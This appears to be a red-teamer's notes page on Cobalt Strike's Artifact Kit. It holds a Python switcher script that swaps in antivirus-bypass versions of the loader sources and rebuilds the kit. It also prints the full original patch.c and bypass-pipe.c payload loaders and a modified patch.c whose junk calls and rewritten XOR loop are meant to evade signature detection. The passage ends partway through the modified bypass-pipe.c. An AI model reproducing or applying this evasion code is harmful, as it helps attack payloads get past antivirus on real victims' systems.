### Folder Structure in `/opt/cobaltstrike/arsenal-kit/kits/artifact/`
```bash
artifact-kit-AV-switcher/
├── originals/
│   ├── patch.c
│   └── bypass-pipe.c
├── bypass_versions/
│   ├── patch.c
│   └── bypass-pipe.c
├── backups/               <-- Automatically created for backups
├── artifact_kit_switcher.py
```
#### `artifact-kit-switcher.py`
- This script replaces the `patch.c` and `bypass-pipe.c`  files from a `DEFAULT` version to a `MODIFIED` version that bypasses `AV` and recompiles the entire `arsenal kit` to allow artifacts to either bypass or  not bypass.
- The script also places `backups` into the `/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/backups`
```bash
┌──(root💀gobots)-[05Apr2025 01:39:56]-[/opt/…/arsenal-kit/kits/artifact/artifact-kit-AV-switcher]
└─# sha256sum artifact-kit-switcher.py 
57d5a03e22a60a3f8c806b44ef0617154f76c3b003b846ca87eb69139864f184  artifact-kit-switcher.py
```
#### `artifact-kit-switcher.py original`
```python
import os
import shutil
import time
import subprocess

# === CONFIGURATION ===
src_common_dir = "/opt/cobaltstrike/arsenal-kit/kits/artifact/src-common"
originals_dir = "/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/originals"
bypass_dir = "/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/bypass_versions"
backup_dir = "/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/backups"
build_script_dir = "/opt/cobaltstrike/arsenal-kit"
build_script = os.path.join(build_script_dir, "build_arsenal_kit.sh")

files_to_swap = ["patch.c", "bypass-pipe.c"]

# === HELPERS ===
def ensure_backup_dir():
    if not os.path.exists(backup_dir):
        os.makedirs(backup_dir)

def timestamp():
    return time.strftime("%Y%m%d-%H%M%S")

def backup_files():
    ensure_backup_dir()
    ts = timestamp()
    for filename in files_to_swap:
        src = os.path.join(src_common_dir, filename)
        if os.path.exists(src):
            dst = os.path.join(backup_dir, f"{filename}.{ts}.bak")
            shutil.copy2(src, dst)
            print(f"📦 Backed up {filename} → {dst}")
        else:
            print(f"⚠ {filename} not found in {src_common_dir}, skipping backup.")

def switch_files(source_dir):
    print(f"\n🔁 Swapping files from: {source_dir}")
    backup_files()
    for filename in files_to_swap:
        src = os.path.join(source_dir, filename)
        dst = os.path.join(src_common_dir, filename)
        if os.path.exists(src):
            shutil.copy2(src, dst)
            print(f"✅ Replaced {filename}")
        else:
            print(f"❌ {filename} not found in {source_dir}, skipping.")

def rebuild_artifact_kit():
    print("\n🛠 Rebuilding Artifact Kit using build_arsenal_kit.sh...")
    try:
        subprocess.run(["bash", "build_arsenal_kit.sh"], cwd=build_script_dir, check=True)
        print("✅ Arsenal Kit rebuilt successfully.")
    except subprocess.CalledProcessError as e:
        print(f"❌ Build failed: {e}")
    except FileNotFoundError:
        print(f"❌ Could not find build script at: {build_script}")

def show_menu():
    print("\n==== Artifact Kit Patch Switcher ====")
    print("1. Use ORIGINAL files (no AV bypass)")
    print("2. Use BYPASS files (AV evasion)")
    print("3. Exit")

def main():
    while True:
        show_menu()
        choice = input("Choose an option (1-3): ").strip()
        if choice == "1":
            switch_files(originals_dir)
            rebuild_artifact_kit()
        elif choice == "2":
            switch_files(bypass_dir)
            rebuild_artifact_kit()
        elif choice == "3":
            print("👋 Exiting...")
            break
        else:
            print("❌ Invalid choice. Try again.")

if __name__ == "__main__":
    main()

```
#### `artifact-kit-switcher.py ( spider version)`
```python
┌──(root💀gobots)-[07Apr2025 20:02:14]-[/opt/…/arsenal-kit/kits/artifact/artifact-kit-AV-switcher]
└─# sha256sum artifact-kit-switcher2.py
4616ead0a3a456767f0a53ecef71da146b7764f5f3e0b0e0338c43af8ea1d3ce  artifact-kit-switcher2.py
```

```python
import os
import shutil
import time
import subprocess
import threading
import itertools
import sys

# === CONFIGURATION ===
src_common_dir = "/opt/cobaltstrike/arsenal-kit/kits/artifact/src-common"
originals_dir = "/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/originals"
bypass_dir = "/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/bypass_versions"
backup_dir = "/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/backups"
build_script_dir = "/opt/cobaltstrike/arsenal-kit"
build_script = os.path.join(build_script_dir, "build_arsenal_kit.sh")

files_to_swap = ["patch.c", "bypass-pipe.c"]

# === HELPERS ===
def ensure_backup_dir():
    if not os.path.exists(backup_dir):
        os.makedirs(backup_dir)

def timestamp():
    return time.strftime("%Y%m%d-%H%M%S")

def backup_files():
    ensure_backup_dir()
    ts = timestamp()
    for filename in files_to_swap:
        src = os.path.join(src_common_dir, filename)
        if os.path.exists(src):
            dst = os.path.join(backup_dir, f"{filename}.{ts}.bak")
            shutil.copy2(src, dst)
            print(f"📦 Backed up {filename} → {dst}")
        else:
            print(f"⚠ {filename} not found in {src_common_dir}, skipping backup.")

def switch_files(source_dir):
    print(f"\n🔁 Swapping files from: {source_dir}")
    backup_files()
    for filename in files_to_swap:
        src = os.path.join(source_dir, filename)
        dst = os.path.join(src_common_dir, filename)
        if os.path.exists(src):
            shutil.copy2(src, dst)
            print(f"✅ Replaced {filename}")
        else:
            print(f"❌ {filename} not found in {source_dir}, skipping.")

# === Spider Animation ===
def spider_loader(stop_event):
    spider_frames = ["🕷 ", " 🕷", "  🕷", "   🕷", "  🕷", " 🕷"]
    for frame in itertools.cycle(spider_frames):
        if stop_event.is_set():
            break
        sys.stdout.write(f"\r{frame} Building Arsenal Kit... ")
        sys.stdout.flush()
        time.sleep(0.2)
    sys.stdout.write("\r✅ Arsenal Kit rebuilt successfully.          \n")

def rebuild_artifact_kit():
    stop_event = threading.Event()
    thread = threading.Thread(target=spider_loader, args=(stop_event,))
    thread.start()

    try:
        subprocess.run(["bash", "build_arsenal_kit.sh"], cwd=build_script_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
    except subprocess.CalledProcessError as e:
        stop_event.set()
        thread.join()
        print(f"\n❌ Build failed: {e}")
        return
    except FileNotFoundError:
        stop_event.set()
        thread.join()
        print(f"\n❌ Could not find build script at: {build_script}")
        return

    stop_event.set()
    thread.join()

# === Menu ===
def show_menu():
    print("\n==== Artifact Kit Patch Switcher ====")
    print("1. Use ORIGINAL files (no AV bypass)")
    print("2. Use BYPASS files (AV evasion)")
    print("3. Exit")

def main():
    while True:
        show_menu()
        choice = input("Choose an option (1-3): ").strip()
        if choice == "1":
            switch_files(originals_dir)
            rebuild_artifact_kit()
        elif choice == "2":
            switch_files(bypass_dir)
            rebuild_artifact_kit()
        elif choice == "3":
            print("👋 Exiting...")
            break
        else:
            print("❌ Invalid choice. Try again.")

if __name__ == "__main__":
    main()
```
#### `artifact-kit-switcher.py` but no `arsenal-kit` rebuild
```python
import os
import shutil
import time
import threading
import sys
import random

# === CONFIGURATION ===
src_common_dir = "/opt/cobaltstrike/arsenal-kit/kits/artifact/src-common"
originals_dir = "/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/originals"
bypass_dir = "/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/bypass_versions"
backup_dir = "/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/backups"

files_to_swap = ["patch.c", "bypass-pipe.c"]

# === HELPERS ===
def ensure_backup_dir():
    if not os.path.exists(backup_dir):
        os.makedirs(backup_dir)

def timestamp():
    return time.strftime("%Y%m%d-%H%M%S")

def backup_files():
    ensure_backup_dir()
    ts = timestamp()
    for filename in files_to_swap:
        src = os.path.join(src_common_dir, filename)
        if os.path.exists(src):
            dst = os.path.join(backup_dir, f"{filename}.{ts}.bak")
            shutil.copy2(src, dst)
            print(f"📦 Backed up {filename} → {dst}")
        else:
            print(f"⚠ {filename} not found in {src_common_dir}, skipping backup.")

def switch_files(source_dir):
    print(f"\n🔁 Swapping files from: {source_dir}")
    backup_files()
    for filename in files_to_swap:
        src = os.path.join(source_dir, filename)
        dst = os.path.join(src_common_dir, filename)
        if os.path.exists(src):
            shutil.copy2(src, dst)
            print(f"✅ Replaced {filename}")
        else:
            print(f"❌ {filename} not found in {source_dir}, skipping.")

# === Spider Animation ===
def spider_loader(stop_event):
    width = 40
    direction = 1
    pos = 0
    spider_frames = ["🕷️", "🕸️", "🕷️", "🕷️"]
    
    while not stop_event.is_set():
        frame = random.choice(spider_frames)
        pos += direction * random.randint(1, 3)
        if pos >= width:
            pos = width
            direction = -1
        elif pos <= 0:
            pos = 0
            direction = 1

        padding = " " * pos
        sys.stdout.write(f"\r{padding}{frame} Simulating build...   ")
        sys.stdout.flush()
        time.sleep(0.1)

    sys.stdout.write("\r✅ Simulation complete.                          \n")

def simulate_rebuild():
    stop_event = threading.Event()
    thread = threading.Thread(target=spider_loader, args=(stop_event,))
    thread.start()

    # Simulate delay (e.g., pretend build time)
    time.sleep(5)

    stop_event.set()
    thread.join()

# === Menu ===
def show_menu():
    print("\n==== Artifact Kit Patch Switcher ====")
    print("1. Use ORIGINAL files (no AV bypass)")
    print("2. Use BYPASS files (AV evasion)")
    print("3. Exit")

def main():
    while True:
        show_menu()
        choice = input("Choose an option (1-3): ").strip()
        if choice == "1":
            switch_files(originals_dir)
            simulate_rebuild()
        elif choice == "2":
            switch_files(bypass_dir)
            simulate_rebuild()
        elif choice == "3":
            print("👋 Exiting...")
            break
        else:
            print("❌ Invalid choice. Try again.")

if __name__ == "__main__":
    main()
```

#### `artifact-kit-switcher.py` with `patch.c` `bypass-pipe.c` & `compress.ps1` for `artifact and resource kit`
```python

```
------------
#### originals directory  

##### patch.c original `4.11`
Copying `patch.c` from a fresh `4.11 Cobalt Strike`  at `/home/kali/Desktop` to working artifact kit at `/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/originals/`
```bash
┌──(root💀gobots)-[04Apr2025 23:09:43]-[/home/…/arsenal-kit/kits/artifact/src-common]
└─# sha256sum patch.c
451195ef787fcf6f30405afc2cffe812410cf7980ca9b1c3b1fc8d93b688333f  patch.c
```

```c
/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2012-2025 Fortra, LLC and its group of companies. All trademarks and registered trademarks are the property of their respective owners.
 *
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"
#if USE_SYSCALLS == 1
#include "syscalls.h"
#include "utils.h"
#endif

char data[sizeof(phear)] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void set_key_pointers(void * buffer) {
   phear * payload = (phear *)data;

   /* this payload does not adhere to our protocol to pass GetModuleHandleA / GetProcAddress to
      the payload directly. */
   if (payload->gmh_offset <= 0 || payload->gpa_offset <= 0)
      return;

   void * gpa_addr = (void *)GetProcAddress;
   void * gmh_addr = (void *)GetModuleHandleA;

   memcpy(buffer + payload->gmh_offset, &gmh_addr, sizeof(void *));
   memcpy(buffer + payload->gpa_offset, &gpa_addr, sizeof(void *));
}

#ifdef _MIGRATE_
#include "start_thread.c"
#include "injector.c"
void spawn(void * buffer, int length, char * key) {
   char process[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";
   int x;

   /* decode the process name with the key (valid name, \0, junk to fill 64) */
   for (int x = 0; x < sizeof(process); x++) {
      *((char *)process + x) = *((char *)process + x) ^ key[x % 8]; // 8 byte XoR;
   }

   /* decode the payload with the key */
   for (x = 0; x < length; x++) {
      *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];  // 8 byte XoR
   }

   /* propagate our key function pointers to our payload */
   set_key_pointers(buffer);

   inject(buffer, length, process);
}
#else

#if STACK_SPOOF == 1
#include "spoof.c"
#endif

void run(void * buffer) {
   void (*function)();
   function = (void (*)())buffer;
#if STACK_SPOOF == 1
   beacon_threadid = GetCurrentThreadId();
#endif
   function();
}

void spawn(void * buffer, int length, char * key) {
   void * ptr = NULL;

   /* This memory allocation will be released by beacon for these conditions:.
    *    1. The stage.cleanup is set to true
    *    2. The reflective loader passes the address of the loader into DllMain.
    *
    * This is true for the built-in Cobalt Strike reflective loader and the example
    * user defined reflective loader (UDRL) in the Arsenal Kit.
    */
#if USE_HeapAlloc
   /* Create Heap */
   HANDLE heap;
   heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);

   /* allocate the memory for our decoded payload */
   ptr = HeapAlloc(heap, 0, 10);

   /* Get wacky and add a bit of of HeapReAlloc */
   if (length > 0) {
      ptr = HeapReAlloc(heap, 0, ptr, length);
   }

#elif USE_VirtualAlloc
#if USE_SYSCALLS == 1
   SIZE_T size = length;
   NtAllocateVirtualMemory(GetCurrentProcess(), &ptr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#else
   ptr = VirtualAlloc(0, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#endif

#elif USE_MapViewOfFile
#if USE_SYSCALLS == 1
   SIZE_T size = length;
   HANDLE hFile = create_file_mapping(0, length);
   ptr = map_view_of_file(hFile);
   NtClose(hFile);
#else
   HANDLE hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, length, NULL);
   ptr = MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
   CloseHandle(hFile);
#endif
#endif


   /* decode the payload with the key */
   for (int x = 0; x < length; x++) {
      *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8]; // 8 byte XoR
   }

#if STACK_SPOOF == 1
   /* setup stack spoofing */
   set_stack_spoof_code();
#endif

   /* propagate our key function pointers to our payload */
   set_key_pointers(ptr);

#if defined(USE_VirtualAlloc) || defined(USE_MapViewOfFile)
   /* fix memory protection */
   DWORD old;
#if USE_SYSCALLS == 1
   NtProtectVirtualMemory(GetCurrentProcess(), &ptr, &size, PAGE_EXECUTE_READ, &old);
#else
   VirtualProtect(ptr, length, PAGE_EXECUTE_READ, &old);
#endif
#endif

   /* spawn a thread with our data */
#if USE_SYSCALLS == 1
   HANDLE thandle;
   NtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), &run, ptr, 0, 0, 0, 0, NULL);
#else
   CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
#endif
}
#endif
```


##### bypass-pipe.c original `4.11`
Copying `bypass-pipe.c` from a fresh `4.11 Cobalt Strike`  at `/home/kali/Desktop` to working artifact kit at `/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/originals/`
```bash
┌──(root💀gobots)-[04Apr2025 23:41:50]-[/home/…/arsenal-kit/kits/artifact/src-common]
└─# sha256sum bypass-pipe.c 
fcfc6cb402660a9d63f822eab7648c24595010b0e6f61091af03f00caa4e63e2  bypass-pipe.c
```

```c
/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2012-2025 Fortra, LLC and its group of companies. All trademarks and registered trademarks are the property of their respective owners.
 *
 *
 * A/V sandbox bypass with named pipes.
 *
 * Strategy - feed obfuscated payload data through a named pipe before
 *            executing it. This will cause many A/V sandbox tools to
 *            give up on the binary.
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"
#if USE_SYSCALLS == 1
#include "syscalls.h"
#include "utils.h"
#endif

/* a place to track our random-ish pipe name */
char pipename[64];

void server(char * data, int length) {
   DWORD  wrote = 0;
#if USE_SYSCALLS == 1
   HANDLE pipe = create_named_pipe(pipename);
#else
   HANDLE pipe = CreateNamedPipeA(pipename, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE, 1, 0, 0, 0, NULL);
#endif

   if (pipe == NULL || pipe == INVALID_HANDLE_VALUE)
      return;

#if USE_SYSCALLS == 1
   BOOL result = connect_named_pipe(pipe);
#else
   BOOL result = ConnectNamedPipe(pipe, NULL);
#endif
   if (!result)
      return;

   while (length > 0) {
#if USE_SYSCALLS == 1
      result = write_file(pipe, data, length, &wrote);
#else
      result = WriteFile(pipe, data, length, &wrote, NULL);
#endif
      if (!result)
         break;

      data   += wrote;
      length -= wrote;
   }

#if USE_SYSCALLS == 1
   NtClose(pipe);
#else
   CloseHandle(pipe);
#endif
}

BOOL client(char * buffer, int length) {
   DWORD  read = 0;
#if USE_SYSCALLS == 1
   HANDLE pipe = create_named_pipe_file(pipename);
#else
   HANDLE pipe = CreateFileA(pipename, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
#endif
   if (pipe == INVALID_HANDLE_VALUE)
      return FALSE;

   /* read the encoded payload from the pipe */
   while (length > 0) {
#if USE_SYSCALLS == 1
      BOOL result = read_file(pipe, buffer, length, &read);
#else
      BOOL result = ReadFile(pipe, buffer, length, &read, NULL);
#endif
      if (!result)
         break;

      buffer += read;
      length -= read;
   }

#if USE_SYSCALLS == 1
   NtClose(pipe);
#else
   CloseHandle(pipe);
#endif
   return TRUE;
}

DWORD server_thread(LPVOID whatever) {
   phear * payload = (phear *)data;

   /* setup a pipe for our payload */
   server(payload->payload, payload->length);

   return 0;
}

DWORD client_thread(LPVOID whatever) {
   phear * payload = (phear *)data;

   /* allocate data for our "cleaned" payload */
   char * buffer = (char *)malloc(payload->length);

   /* try to connect to the pipe */
   do {
      Sleep(1024);
   }
   while (!client(buffer, payload->length));

   /* spawn our payload */
   spawn(buffer, payload->length, payload->key);

   /* clean up after ourselves */
   free(buffer);

   return 0;
}

void start(HINSTANCE mhandle) {
   /* switched from snprintf... as some A/V product was flagging based on the function *sigh* 
      92, 92, 46, 92, 112, 105, 112, 101, 92 is \\.\pipe\
   
   */
   sprintf(pipename, "%c%c%c%c%c%c%c%c%cnetsvc\\%d", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));

   /* start our server and our client */
#if USE_SYSCALLS == 1
   HANDLE thandle;
   NtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), &server_thread, NULL, 0, 0, 0, 0, NULL);
#else
   CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&server_thread, (LPVOID) NULL, 0, NULL);
#endif

   client_thread(NULL);
}
```






Copying `bypass-pipe.c` from a fresh `4.11 Cobalt Strike`  at `/home/kali/Desktop` to working artifact kit at `/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/originals/`
```bash
┌──(root💀gobots)-[04Apr2025 23:41:50]-[/home/…/arsenal-kit/kits/artifact/src-common]
└─# sha256sum bypass-pipe.c 
fcfc6cb402660a9d63f822eab7648c24595010b0e6f61091af03f00caa4e63e2  bypass-pipe.c
```


#### bypass_versions directory

##### patch.c  OPTEVFOR Modification `4.11`
Copying `patch.c` from a OPTEVFOR `4.11 Cobalt Strike`  at `/opt/cobaltstrike/arsenal-kit/kits/artifact/src-common` to working artifact kit at `/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/bypass_versions/`
```bash
┌──(root💀gobots)-[05Apr2025 00:10:42]-[/opt/…/arsenal-kit/kits/artifact/src-common]
└─# sha256sum bypass-pipe.c
905afa929bb4498eb0760676d981c86054d7a620fbbaa5d1682f399752d76e82  patch.c
```

```c
/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2012-2025 Fortra, LLC and its group of companies. All trademarks and registered trademarks are the property of their respective owners.
 *
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"
#if USE_SYSCALLS == 1
#include "syscalls.h"
#include "utils.h"
#endif

char data[sizeof(phear)] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void set_key_pointers(void * fluffer) {
   phear * payload = (phear *)data;

   /* this payload does not adhere to our protocol to pass GetModuleHandleA / GetProcAddress to
      the payload directly. */
   if (payload->gmh_offset <= 0 || payload->gpa_offset <= 0)
      return;

   void * gpa_addr = (void *)GetProcAddress;
   void * gmh_addr = (void *)GetModuleHandleA;

   memcpy(fluffer + payload->gmh_offset, &gmh_addr, sizeof(void *));
   memcpy(fluffer + payload->gpa_offset, &gpa_addr, sizeof(void *));
}

#ifdef _MIGRATE_
#include "start_thread.c"
#include "injector.c"
 // Line 36
void spawn(void * fluffer, int length, char * key) {
   char process[64] = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM";
   int z;
   /* decode the process name with the key (valid name, \0, junk to fill 64) */
   for (int z = 0; z < sizeof(process); z++) {
      char* a = (char *)process + z;
      char* b = (char *)process + z;
      GetTickCount();
      *a = *b ^ key[z % 8];
   }
   /* decode the payload with the key */
   for (z = 0; z < length; z++) {
      char* a = (char *)fluffer + z;
      char* b = (char *)fluffer + z;
      GetTickCount();
      *a = *b ^ key[z % 8];
   }
   /* propagate our key function pointers to our payload */
   set_key_pointers(fluffer);
   inject(fluffer, length, process);
}
#else

#if STACK_SPOOF == 1
#include "spoof.c"
#endif

void run(void * fluffer) {
   void (*function)();
   function = (void (*)())fluffer;
#if STACK_SPOOF == 1
   beacon_threadid = GetCurrentThreadId();
#endif
   function();
}

void spawn(void * fluffer, int length, char * key) {
   void * ptr = NULL;

   /* This memory allocation will be released by beacon for these conditions:.
    *    1. The stage.cleanup is set to true
    *    2. The reflective loader passes the address of the loader into DllMain.
    *
    * This is true for the built-in Cobalt Strike reflective loader and the example
    * user defined reflective loader (UDRL) in the Arsenal Kit.
    */
#if USE_HeapAlloc
   /* Create Heap */
   HANDLE heap;
   heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);

   /* allocate the memory for our decoded payload */
   ptr = HeapAlloc(heap, 0, 10);

   /* Get wacky and add a bit of of HeapReAlloc */
   if (length > 0) {
      ptr = HeapReAlloc(heap, 0, ptr, length);
   }

#elif USE_VirtualAlloc
#if USE_SYSCALLS == 1
   SIZE_T size = length;
   NtAllocateVirtualMemory(GetCurrentProcess(), &ptr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#else
   ptr = VirtualAlloc(0, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#endif

#elif USE_MapViewOfFile
#if USE_SYSCALLS == 1
   SIZE_T size = length;
   HANDLE hFile = create_file_mapping(0, length);
   ptr = map_view_of_file(hFile);
   NtClose(hFile);
#else
   HANDLE hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, length, NULL);
   ptr = MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
   CloseHandle(hFile);
#endif
#endif


   // ~ Line 118
   int index = 0;  
   while (index < length) {  
      char *a = (char *)ptr + index;  
      char *b = (char *)fluffer + index;  
      GetTickCount();  
      *a = *b ^ key[index & 7]; // Using bitwise AND instead of modulus for the same effect  
      GetTickCount();
      index++;  
   }  

#if STACK_SPOOF == 1
   /* setup stack spoofing */
   set_stack_spoof_code();
#endif

   /* propagate our key function pointers to our payload */
   set_key_pointers(ptr);

#if defined(USE_VirtualAlloc) || defined(USE_MapViewOfFile)
   /* fix memory protection */
   DWORD old;
#if USE_SYSCALLS == 1
   NtProtectVirtualMemory(GetCurrentProcess(), &ptr, &size, PAGE_EXECUTE_READ, &old);
#else
   VirtualProtect(ptr, length, PAGE_EXECUTE_READ, &old);
#endif
#endif

   /* spawn a thread with our data */
#if USE_SYSCALLS == 1
   HANDLE thandle;
   NtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), &run, ptr, 0, 0, 0, 0, NULL);
#else
   CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
#endif
}
#endif

```
##### bypass-pipe.c  OPTEVFOR Modification `4.11`
Copying `bypass-pipe.c` from a OPTEVFOR `4.11 Cobalt Strike`  at `/opt/cobaltstrike/arsenal-kit/kits/artifact/src-common` to working artifact kit at `/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/bypass_versions/`
```bash
┌──(root💀gobots)-[05Apr2025 00:10:42]-[/opt/…/arsenal-kit/kits/artifact/src-common]
└─# sha256sum bypass-pipe.c
d839865f0067ac16f68f11e4911fd75d0ae6fcb760d0e1f257e068e09454c7ea  bypass-pipe.c
```

```c
/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2012-2025 Fortra, LLC and its group of companies. All trademarks and registered trademarks are the property of their respective owners.
 *
 *
 * A/V sandbox bypass with named pipes.
 *
 * Strategy - feed obfuscated payload data through a named pipe before
 *            executing it. This will cause many A/V sandbox tools to
 *            give up on the binary.
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"
#if USE_SYSCALLS == 1
#include "syscalls.h"
#include "utils.h"
#endif

/* a place to track our random-ish pipe name */
char pipename[64];

void server(char * data, int length) {
   DWORD  wrote = 0;
#if USE_SYSCALLS == 1
   HANDLE pipe = create_named_pipe(pipename);
#else
   HANDLE pipe = CreateNamedPipeA(pipename, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE, 1, 0, 0, 0, NULL);
#endif

   if (pipe == NULL || pipe == INVALID_HANDLE_VALUE)
      return;

#if USE_SYSCALLS == 1
   BOOL result = connect_named_pipe(pipe);
#else
   BOOL result = ConnectNamedPipe(pipe, NULL);
#endif
   if (!result)
      return;

   while (length > 0) {
#if USE_SYSCALLS == 1
      result = write_file(pipe, data, length, &wrote);
#else
      result = WriteFile(pipe, data, length, &wrote, NULL);
#endif
      if (!result)
         break;

      data   += wrote;
      length -= wrote;
   }

#if USE_SYSCALLS == 1
   NtClose(pipe);
#else
   CloseHandle(pipe);
#endif
}

BOOL client(char * buffer, int length) {
